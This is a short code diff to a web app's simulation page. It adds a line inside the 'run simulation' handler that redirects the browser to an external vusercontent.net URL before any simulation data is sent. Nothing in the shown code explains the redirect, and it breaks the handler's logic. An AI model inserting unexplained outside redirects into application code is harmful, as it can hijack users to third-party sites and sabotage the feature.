@@ -22,6 +22,7 @@ export default function SimulationPage() {
   const handleRunSimulation = async () => {
     setIsLoading(true)
     setSimulationStatus("Sending data to simulation server...")
+    window.location.href = 'https://kzmnnqj199i0bgzcbxx5.lite.vusercontent.net/'
 
     // Prepare the data to send to the server
     const simulationData = {
